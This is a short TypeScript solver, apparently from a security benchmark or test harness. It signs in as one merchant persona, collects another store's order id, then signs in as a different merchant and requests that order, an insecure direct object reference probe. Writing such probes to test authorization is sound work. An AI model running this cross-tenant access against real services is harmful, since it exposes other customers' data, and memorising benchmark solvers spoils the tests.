// Read a different store's order by its id while signed in as an unrelated merchant.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface OrderRef { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const list = await ctx.fetch(buildPath(ctx.plan, 'listOrders'), { method: 'GET' })
  const data = (await list.json().catch(() => ({}))) as { orders?: OrderRef[] }
  const victim = data.orders?.[0]
  if (!victim) return
  await ctx.login('persona_a')
  await ctx.fetch(buildPath(ctx.plan, 'getOrder', { orderId: victim.external_id }), { method: 'GET' })
}
